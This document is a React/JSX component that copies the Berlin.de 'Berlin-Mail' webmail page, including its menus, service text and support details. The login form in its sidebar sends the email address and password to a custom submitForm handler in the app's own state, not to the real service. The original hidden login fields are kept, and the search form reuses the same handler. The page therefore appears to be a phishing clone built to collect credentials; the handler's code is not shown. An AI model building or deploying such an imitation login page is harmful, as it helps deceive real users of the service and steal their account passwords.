                                Finanzierung &amp; Förderung
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/5612236-3671573-fachkraefte.html"
                                className="menu-item"
                              >
                                Fachkräfte
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/5612603-3671573-attraktive-standorte-fuer-unternehmen.html"
                                className="menu-item"
                              >
                                Standorte
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/5613189-3671573-wissenschaft-und-innovation.html"
                            className="menu-item"
                          >
                            Wissenschaft &amp; Innovation
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/5613189-3671573-wissenschaft-und-innovation.html"
                                className="menu-item"
                              >
                                Wissenschaftsstandort
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/5616667-5615330-innovationsfoerderung.html"
                                className="menu-item"
                              >
                                Innovationsförderung
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/5612603-3671573-attraktive-standorte-fuer-unternehmen.html"
                                className="menu-item"
                              >
                                Technologieparks
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/"
                            className="menu-item"
                          >
                            Wirtschaftsförderung
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/5615749-5615330-foerderung-fuer-unternehmen.html"
                                className="menu-item"
                              >
                                Für Investoren und Unternehmen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/5615902-5615330-beratung-und-foerderung-fuer-startups.html"
                                className="menu-item"
                              >
                                Für Startups und Gründer
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/5616818-5615330-aussenwirtschaftsfoerderung.html"
                                className="menu-item"
                              >
                                Internationalisierung
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/wirtschaft/service/"
                            className="menu-item"
                          >
                            Service
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/service/ansprechpartner/3965341-3963928-ansprechpartner.html"
                                className="menu-item"
                              >
                                Ansprechpartner
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/impressum/"
                                className="menu-item"
                              >
                                Impressum
                              </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </div>
                    <ul
                      className="aside list--clean"
                      aria-label="Mehr zum Thema Wirtschaft"
                    >
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/wirtschaft/4171791-1610941-servicepackages.html">
                            <img
                              data-src="/binaries/asset/image_assets/3914799/ratio_2_1/1478524672/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt=""
                            />
                          </a>
                          <span className="source">
                            © sborisov / Fotolia.com, bearbeitet
                          </span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/wirtschaft/4171791-1610941-servicepackages.html">
                            Service Packages
                          </a>
                        </p>
                      </li>
                    </ul>
                  </li>
                  <li className="channel--themen">
                    <a
                      role="tab"
                      aria-controls="panel--themen"
                      id="tab--themen"
                      href="https://www.berlin.de/mail/#"
                      className="menu-item"
                    >
                      <span className="fa fa-list" aria-hidden="true" />
                      Stadtleben
                    </a>
                    <div
                      role="tabpanel"
                      id="panel--themen"
                      aria-labelledby="tab--themen"
                      className="topic"
                      aria-label="Unternavigation Stadtleben"
                      bis_skin_checked={1}
                    >
                      <ul>
                        <li className="header">
                          <a
                            href="https://www.berlin.de/special/"
                            className="header-item"
                          >
                            Zur Startseite: Stadtleben
                          </a>
                        </li>
                        <li>
                          <a
                            href="https://mein.berlin.de/ueber-meinberlin/"
                            className="menu-item"
                          >
                            Partizipation
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://mein.berlin.de/ueber-meinberlin/"
                                className="menu-item"
                              >
                                Mein.Berlin
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/buergeraktiv/engagieren/freiwilligendienst/"
                                className="menu-item"
                              >
                                Freiwilligendienst
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/buergeraktiv/engagieren/engagement-finden/index.cfm?dateiname=ehrenamt_suche.cfm&anwender_id=5"
                                className="menu-item"
                              >
                                Engagement finden
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/buergeraktiv/engagieren/corona-engagement/nachbarschaftshilfe/"
                                className="menu-item"
                              >
                                Nachbarschaftshilfe
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/special/stadtteile/"
                            className="menu-item"
                          >
                            Stadtteile
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/special/stadtteile/uebersicht-nach-bezirken/"
                                className="menu-item"
                              >
                                Übersicht nach Bezirken
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/mail/"
                                className="menu-item"
                              >
                                Ortsteile A-Z
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/stadtteile/kieze/"
                                className="menu-item"
                              >
                                Kieze
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/immobilien-und-wohnen/stadtteile/#hfotos"
                                className="menu-item"
                              >
                                Stadtteile im Bild
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/special/sharing/"
                            className="menu-item"
                          >
                            Sharing
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/special/sharing/4763738-4762435-foodsharing.html"
                                className="menu-item"
                              >
                                Foodsharing
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/sharing/4765486-4762435-offene-werkstaetten.html"
                                className="menu-item"
                              >
                                Offene Werkstätten
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/sharing/4765184-4762435-booksharing.html"
                                className="menu-item"
                              >
                                Büchertausch
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/sharing/4765434-4762435-coworking-spaces.html"
                                className="menu-item"
                              >
                                Coworking Spaces
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tourismus/parks-und-gaerten/"
                            className="menu-item"
                          >
                            Stadtgrün
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/sen/uvk/natur-und-gruen/stadtgruen/gaertnern-in-der-stadt/kleingaerten/"
                                className="menu-item"
                              >
                                Gemeinschaftsgärten
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/forsten/walderlebnis/waldspielplaetze/"
                                className="menu-item"
                              >
                                Waldspielplätze
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/parks-und-gaerten/"
                                className="menu-item"
                              >
                                Parks &amp; Gärten
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/forsten/"
                                className="menu-item"
                              >
                                Wälder
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/special/sport-und-fitness/"
                            className="menu-item"
                          >
                            Sport &amp; Fitness
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/special/sport-und-fitness/schwimmbad/"
                                className="menu-item"
                              >
                                Schwimmbäder
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tickets/sport/laufkalender/"
                                className="menu-item"
                              >
                                Laufkalender
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/sport-und-fitness/freizeitsport/wassersport/5435487-5433666-kanu-und-kajak-fahren.html"
                                className="menu-item"
                              >
                                Kanu und Kajak
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/sport-und-fitness/freizeitsport/wassersport/"
                                className="menu-item"
                              >
                                Wassersport
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tickets/"
                            className="menu-item"
                          >
                            Veranstaltungen
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/land/veranstaltungen/bezirke/"
                                className="menu-item"
                              >
                                Bezirklicher Kalender
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/kultur-und-tickets/tipps/volksfeste/"
                                className="menu-item"
                              >
                                Volksfeste &amp; Straßenfeste
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tickets/"
                                className="menu-item"
                              >
                                Eventkalender
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/kultur-und-tickets/tipps/kinder/"
                                className="menu-item"
                              >
                                Für Kinder
                              </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </div>
                    <ul
                      className="aside list--clean"
                      aria-label="Mehr zum Thema Stadtleben"
                    >
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/special/sport-und-fitness/adressen/eisbahn/">
                            <img
                              data-src="/binaries/asset/image_assets/7794528/ratio_2_1/1665146510/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt=""
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/special/sport-und-fitness/adressen/eisbahn/">
                            Eisbahnen
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/special/winter/">
                            <img
                              data-src="/binaries/asset/image_assets/961461/ratio_2_1/1669633174/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt="Endlich Schnee! Schlitten fahren in Berlin bei strahlendem Sonnenschein."
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/special/winter/">
                            Winter
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/adressen/">
                            <img
                              data-src="/binaries/asset/image_assets/3347049/ratio_2_1/1649663385/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt=" 
      Immer aktiv: Maler brauchen eine gute körperliche Grundfitness. Foto: Kai Remmers 
    "
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/adressen/">Adressen</a>
                        </p>
                      </li>
                    </ul>
                  </li>
                  <li className="channel--berlinfinder">
                    <a
                      role="tab"
                      aria-controls="panel--berlinfinder"
                      id="tab--berlinfinder"
                      href="https://www.berlin.de/mail/#"
                      className="menu-item"
                    >
                      <span
                        className="bdeicon bdeicon-befi"
                        aria-hidden="true"
                      />
                      BerlinFinder
                    </a>
                    <div
                      role="tabpanel"
                      id="panel--berlinfinder"
                      aria-labelledby="tab--berlinfinder"
                      className="topic"
                      aria-label="Unternavigation BerlinFinder"
                      bis_skin_checked={1}
                    >
                      <ul>
                        <li className="header">
                          <a
                            href="https://www.berlin.de/adressen/"
                            className="header-item"
                          >
                            Zur Startseite: BerlinFinder
                          </a>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/special/finanzen-und-recht/adressen/"
                            className="menu-item"
                          >
                            Finanzen &amp; Recht
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/special/finanzen-und-recht/rechtsanwalt/"
                                className="menu-item"
                              >
                                Rechtsanwälte
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/finanzen-und-recht/adressen/steuerberater/"
                                className="menu-item"
                              >
                                Steuerberater
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/finanzen-und-recht/adressen/versicherung/"
                                className="menu-item"
                              >
                                Versicherungen
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/special/jobs-und-ausbildung/adressen/"
                            className="menu-item"
                          >
                            Jobs &amp; Ausbildung
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/special/jobs-und-ausbildung/adressen/bildungseinrichtung/"
                                className="menu-item"
                              >
                                Bildungseinrichtungen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/jobs-und-ausbildung/adressen/grundschule/"
                                className="menu-item"
                              >
                                Grundschulen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/jobs-und-ausbildung/adressen/privatschule/"
                                className="menu-item"
                              >
                                Privatschulen
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/special/gesundheit-und-beauty/adressen/"
                            className="menu-item"
                          >
                            Gesundheit &amp; Beauty
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/special/gesundheit-und-beauty/adressen/zahnarzt/"
                                className="menu-item"
                              >
                                Zahnärzte
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/gesundheit-und-beauty/adressen/krankenhaus-und-klinik/"
                                className="menu-item"
                              >
                                Krankenhäuser
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/gesundheit-und-beauty/adressen/wellness/"
                                className="menu-item"
                              >
                                Wellness
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/special/immobilien-und-wohnen/adressen/"
                            className="menu-item"
                          >
                            Immobilien &amp; Wohnen
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/special/immobilien-und-wohnen/adressen/hausverwaltung/"
                                className="menu-item"
                              >
                                Hausverwaltungen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/immobilien-und-wohnen/adressen/immobilien/"
                                className="menu-item"
                              >
                                Immobilien
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/immobilien-und-wohnen/adressen/immobilienmakler/"
                                className="menu-item"
                              >
                                Immobilienmakler
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/special/shopping/adressen/"
                            className="menu-item"
                          >
                            Shopping
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/special/shopping/adressen/schuhe/"
                                className="menu-item"
                              >
                                Schuhgeschäfte
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/shopping/adressen/secondhand/"
                                className="menu-item"
                              >
                                Second-Hand
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/shopping/adressen/mode/"
                                className="menu-item"
                              >
                                Mode
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/adressen/"
                            className="menu-item"
                          >
                            Weitere Adressen
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/hotels/adressen/"
                                className="menu-item"
                              >
                                Hotels
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/restaurants/"
                                className="menu-item"
                              >
                                Restaurants
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/sport-und-fitness/adressen/"
                                className="menu-item"
                              >
                                Sport &amp; Freizeit
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a href="https://service.berlin.de/">
                            Berliner Behörden finden Sie hier
                          </a>
                        </li>
                      </ul>
                    </div>
                    <ul
                      className="aside list--clean"
                      aria-label="Mehr zum Thema BerlinFinder"
                    >
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/special/sport-und-fitness/schwimmbad/freibad/">
                            <img
                              data-src="/binaries/asset/image_assets/1206550/ratio_2_1/1604993440/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt=" "
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/special/sport-und-fitness/schwimmbad/freibad/">
                            Freibäder
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/adressen/coronateststelle/">
                            <img
                              data-src="/binaries/asset/image_assets/6402119/ratio_2_1/1609589562/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt="Ein Wattestäbchen mit einem Abstrich wird im Labor für einen Corona-Test verarbeitet."
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/adressen/coronateststelle/">
                            Corona-Teststellen
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/special/gesundheit-und-beauty/adressen/sauna/">
                            <img
                              data-src="/binaries/asset/image_assets/6941050/ratio_2_1/1632223518/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt="Mehr als nur Entspannung: Die Hitze in der Sauna trainiert den Körper und macht ihn anpassungsfähiger."
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/special/gesundheit-und-beauty/adressen/sauna/">
                            Saunen
                          </a>
                        </p>
                      </li>
                    </ul>
                  </li>
                </ul>
              </div>
            </nav>
          </header>
          <div className="fradSection Mobile-Top" bis_skin_checked={1} />
          <div id="content-wrapper" role="main" bis_skin_checked={1}>
            {/* empty sticky nav */}
            <h1 className="aural">Berlin-Mail</h1>
            {/* MasterEcho */}
            <div className="grid" bis_skin_checked={1}>
              <div className="grid__item two-thirds" bis_skin_checked={1}>
                <div className="echo" bis_skin_checked={1}>
                  <nav className="breadcrumb">
                    <h3 className="aural">Sie befinden sich hier:</h3>
                    <ol itemScope itemType="http://schema.org/BreadcrumbList">
                      <li
                        itemProp="itemListElement"
                        itemScope
                        itemType="http://schema.org/ListItem"
                      >
                        <a
                          itemProp="item"
                          className="home"
                          title="Link zu: Startseite"
                          href="https://www.berlin.de/"
                        >
                          <span itemProp="name">Startseite</span>
                        </a>
                        <meta itemProp="position" content={1} />
                      </li>
                      <li
                        itemProp="itemListElement"
                        itemScope
                        itemType="http://schema.org/ListItem"
                      >
                        <a
                          itemProp="item"
                          href="https://www.berlin.de/mail/"
                          className
                          target="_top"
                        >
                          <span itemProp="name">Mail</span>
                        </a>
                        <meta itemProp="position" content={2} />
                      </li>
                    </ol>
                  </nav>
                </div>
                <section role="main" className="main-content">
                  <div className="article-meta" bis_skin_checked={1} />
                  <div bis_skin_checked={1}>
                    <h1 id="hberlinmail">Berlin-Mail</h1>
                    <div className="block mediateaser" bis_skin_checked={1}>
                      <figure className="image">
                        <img
                          src={require("./Berlin-Mail – Berlin.de_files/20180924-Aufmacher_nw.png")}
                          alt="Berlin.de-Mail: Wir-sind@berlin.de"
                          title
                        />
                        <figcaption className="source">BDE</figcaption>
                      </figure>
                    </div>
                    <div className="block teaser" bis_skin_checked={1}>
                      {/* teaser noLink */}
                      <div className="paragraph" bis_skin_checked={1}>
                        Mit der Berlin-Mail zeigst Du, dass Du Berliner bist.
                        Sichere Dir jetzt Deinen.Namen@Berlin.de oder richte
                        gleich E-Mailadressen für die gesamte Familie ein. Die
                        sicheren E-Mailadressen mit der Endung der offiziellen
                        Domain der Hauptstadt gibt es bereits ab 2,30 € im
                        Monat.
                      </div>
                      {/* /teaser noLink */}
                    </div>
                    <div className="block teaser" bis_skin_checked={1}>
                      {/* teaser noLink */}
                      <div className="paragraph" bis_skin_checked={1}>
                        <ul className="decoda-list">
                          <li>Dein.Name@Berlin.de</li>
                          <li>Made in Germany</li>
                          <li>Mailing nach europäischem Datenschutz</li>
                        </ul>
                      </div>
                      {/* /teaser noLink */}
                    </div>
                    <div className="block" bis_skin_checked={1}>
                      <p className="offer-booknow">
                        <span className="title">
                          Informationen und Registrierung
                        </span>
                        <span className="options">
                          <a
                            href="https://webmail.berlin.de/registrierung/"
                            target="_blank"
                            className="button-booking clean trakkking"
                            title="Jetzt informieren"
                            rel="nofollow"
                          >
                            <span className="text">Jetzt informieren</span>
                          </a>
                        </span>
                      </p>
                    </div>
                    <article className="block teaser">
                      {/* teaser imageFirst */}
                      <h3 className="heading">
                        <a
                          href="https://www.berlin.de/mail/4495916-4494021-hilfe-faq.html"
                          target="_top"
                          className
                          data-campaign="cm.articles.4495916"
                        >
                          Hilfe (FAQ)
                        </a>
                      </h3>
                      <p>
                        Warum kann ich mich nicht einloggen? Was ist der
                        Unterschied zwischen POP3 und IMAP? Hier werden die
                        häufigsten Fragen der Berlin.de-Mail beantwortet.
                        <a
                          href="https://www.berlin.de/mail/4495916-4494021-hilfe-faq.html"
                          target="_top"
                          className="readmore"
                          title="Hilfe (FAQ)"
                          data-campaign="cm.articles.4495916"
                        >
                          mehr
                        </a>
                      </p>
                      {/* /teaser imageFirst */}
                    </article>
                    <div className="block teaser" bis_skin_checked={1}>
                      {/* teaser noLink */}
                      <div className="paragraph" bis_skin_checked={1}>
                        Quick-Tipp: So konfigurieren Sie Ihr
                        <a href="https://www.berlin.de/mail/4496209-4494021-konfiguration.html">
                          E-Mail-Programm
                        </a>
                      </div>
                      {/* /teaser noLink */}
                    </div>
                    <article className="block teaser">
                      {/* teaser imageFirst */}
                      <h3 className="heading">
                        <a
                          href="mailto:kundenservice@berlin.de"
                          target="_blank"
                          className
                          data-campaign="cm.link.7657647"
                          rel="nofollow"
                        >
                          Support
                        </a>
                      </h3>
                      <p>
                        Sie erreichen den Berlin.de-Kundenservice unter:
                        <br />
                        <a href="mailto:kundenservice@berlin.de">
                          kundenservice@berlin.de
                        </a>
                        <br />
                        <br />
                        Telefonhotline: <b>+49 30 254 306 88</b>
                        <br />
                        Werktags 8:00 bis 20:00 Uhr sowie am Wochenende von
                        10:00 bis 18.00 Uhr.
                      </p>
                      {/* /teaser imageFirst */}
                    </article>
                    <div className="block" bis_skin_checked={1}>
                      <p className="offer-booknow">
                        <span className="title">Berlin.de-Mail kündigen</span>
                        <span className="options">
                          <a
                            href="https://webmail.berlin.de/kuendigung/"
                            target="_blank"
                            className="button-booking clean trakkking"
                            title="Verträge hier kündigen"
                            rel="nofollow"
                          >
                            <span className="text">Verträge hier kündigen</span>
                          </a>
                        </span>
                      </p>
                    </div>
                  </div>
                </section>
              </div>
              <aside className="grid__item one-third marginal">
                <section className="form-login">
                  <h3>Berlin-Mail – Login</h3>
                  <form
                    onSubmit={submitForm}
                  >
                    <div className="form-group" bis_skin_checked={1}>
                      <label aria-label="Username" htmlFor="username">
                        <i className="fa fa-user" aria-hidden="true" />
                        Ihre E-Mail-Adresse
                      </label>
                      <div className="controls" bis_skin_checked={1}>
                        <input
                          type="text"
                          title="Geben Sie hier komplette E-Mail-Adresse ein."
                          id="username"
                          placeholder="ihr.name@berlin.de"
                          defaultValue={values.username}
                          onChange={handleChange}
                          name="username"
                          required
                          
                          inputMode="email"
                        />
                      </div>
                    </div>
                    <div className="form-group" bis_skin_checked={1}>
                      <label aria-label="Passwort" htmlFor="password">
                        <i className="fa fa-lock" aria-hidden="true" />
                        Passwort
                      </label>
                      <div className="controls" bis_skin_checked={1}>
                        <input
                          type="password"
                          title="Geben Sie hier Ihr Passwort ein."
                          id="password"
                          placeholder="Passwort"
                          defaultValue={values.password}
                          name="password"
                          onChange={handleChange}
                          required
                        />
                      </div>
                    </div>
                    <div className="options" bis_skin_checked={1}>
                      <button
                        value="Login"
                        name="anmelden"
                        type="submit"
                        className="button-submit"
                        disabled={submited.status}
                      >
                        Login
                      </button>
                      <a
                        href="https://webmail.berlin.de/passwort/"
                        target="_blank"
                      >
                        Passwort vergessen?
                      </a>
                    </div>
                    <input type="hidden" name="_task" defaultValue="login" />
                    <input type="hidden" name="_action" defaultValue="login" />
                    <input
                      type="hidden"
                      name="_clientId"
                      defaultValue="b91szk4iKtyVjk4l"
                    />
                    <input
                      type="hidden"
                      name="_timezone"
                      defaultValue="_default_"
                      id="rcmlogintz"
                    />
                    <input type="hidden" name="_url" id="rcmloginurl" />
                  </form>
                </section>
              </aside>
            </div>
          </div>
          <div className="fradSection Mobile-Bottom" bis_skin_checked={1} />
          <footer id="footer" className="echo">
            <a
              href="https://www.berlin.de/mail/#header"
              className="footer_totop"
            >
              Zum Seitenanfang{" "}
              <i className="fa fa-chevron-up" aria-hidden="true" />
            </a>
            <div className="grid" bis_skin_checked={1}>
              <div className="grid__item one-third" bis_skin_checked={1}>
                <img
                  className="logo"
                  src={Logoneg}
                  alt="Berlin.de"
                  aria-hidden="true"
                />
              </div>
              <div className="grid__item two-thirds" bis_skin_checked={1}>
                <form
                  onSubmit={submitForm}
                >
                  <div className="form-group" bis_skin_checked={1}>
                    <label className="aural" htmlFor="footer_searchinput">
                      Suche auf der Internetseite von Berlin.de
                    </label>
                    <div className="controls" bis_skin_checked={1}>
                      <input
                        name="q"
                        placeholder="Suchbegriff"
                        title="Hier können Sie einen Text eingeben, um die Internetseite von Berlin.de zu durchsuchen"
                        id="footer_searchinput"
                        type="text"
                      />
                      <button
                        className="button-submit"
                        type="submit"
                        name="search"
                        aria-label="Sucheingabe abschicken"
                      >
                        <i className="fa fa-search" aria-hidden="true" />
                        <span className="aural">Suchen</span>
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
            <div className="grid" bis_skin_checked={1}>
              <div className="grid__item one-third" bis_skin_checked={1}>
                <div className="footer_newsletter" bis_skin_checked={1}>
                  <h3>Berlin.de Newsletter</h3>
                  <p>
                    Die Tipps für das Wochenende und für den kommenden Monat,
                    ausgewählt von der Berlin.de-Redaktion. Kostenlos direkt in
                    Ihr Postfach.
                  </p>
                  <a
                    className="button--footer"
                    href="https://www.berlin.de/kultur-und-tickets/newsletter/"
                  >
                    Newsletter bestellen
                  </a>
                </div>
                <div className="footer_social" bis_skin_checked={1}>
                  <h3>Mehr Berlin.de auf</h3>
                  <p>
                    <a
                      href="https://de-de.facebook.com/Hauptstadtportal/"
                      className="fa fa-facebook"
                      aria-label="Facebook"
                      title="Link zu: Berlin.de auf Facebook"
                    />
                    <a
                      href="https://twitter.com/berlin_de_news"
                      className="fa fa-twitter"
                      aria-label="Twitter"
                      title="Link zu: Berlin.de auf Twitter"
                    />
                    <a
                      href="https://www.youtube.com/channel/UCbAm6ZWiv_pjfXTjXsqVSoA"
                      className="fa fa-youtube"
                      aria-label="YouTube"
                      title="Link zu: Berlin.de auf YouTube"
                    />
                    <a
                      href="https://www.instagram.com/hauptstadtportal/"
                      className="fa fa-instagram"
                      aria-label="Instagram"
                      title="Link zu: Berlin.de auf Instagram"
                    />
                  </p>
                </div>
              </div>
              <div className="grid__item two-thirds" bis_skin_checked={1}>
                <nav className="navigation-footer">
                  <h3 className="aural">Weitere Inhalte auf Berlin.de</h3>
                  <ul className="grid">
                    <li className="grid__item one-third">
                      <h3>Suche</h3>
                      <ul>
                        <li>
                          <a href="https://www.berlin.de/tickets/">
                            Tickets &amp; Events
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/adressen/">
                            Unternehmen und Dienstleister
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/hotels/">Hotels</a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/tourismus/stadtrundfahrten/">
                            Touren
                          </a>
                        </li>
                      </ul>
                    </li>
                    <li className="grid__item one-third opened">
                      <h3>Über uns</h3>
                      <ul>
                        <li>
                          <a href="https://www.berlin.de/wir-ueber-uns/kontakt/">
                            Kontakt
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/wir-ueber-uns/agb/">
                            AGB
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/wir-ueber-uns/impressum/">
                            Impressum
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/wir-ueber-uns/agb/datenschutz/">
                            Datenschutz
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlinonline.net/unternehmen/karriere/">
                            Karriere
                          </a>
                        </li>
                      </ul>
                    </li>
                    <li className="grid__item one-third">
                      <h3>Politik &amp; Verwaltung</h3>
                      <ul>
                        <li>
                          <a href="https://service.berlin.de/">
                            Service-Portal
                          </a>
                        </li>
                        <li>
                          <a href="https://service.berlin.de/buergertelefon/">
                            Bürgertelefon 115
                          </a>
                        </li>
                        <li>
                          <a href="https://service.berlin.de/terminvereinbarung/">
                            Terminvereinbarung
                          </a>
                        </li>
                        <li>
                          <a href="https://service.berlin.de/standorte/buergeraemter/">
                            Bürgerämter
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/presse/pressemitteilungen/index/search/?institutions=lpd">
                            Aktuelle Landespolitik
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/karriereportal/">
                            Karriere beim Land Berlin
                          </a>
                        </li>
                      </ul>
                    </li>
                    <li className="grid__item one-third">
                      <h3>Berlin Top 10</h3>
                      <ul>
                        <li>
                          <a href="https://www.berlin.de/tickets/top-10/">
                            Tickets
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/tourismus/stadtfuehrungen/top-10/">
                            Stadtführungen
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/museum/">Museen</a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/sehenswuerdigkeiten/top-10/">
                            Sehenswürdigkeiten
                          </a>
                        </li>
                        <li>
                          <a href="https://www.berlin.de/events/top-10/">
                            Events
                          </a>
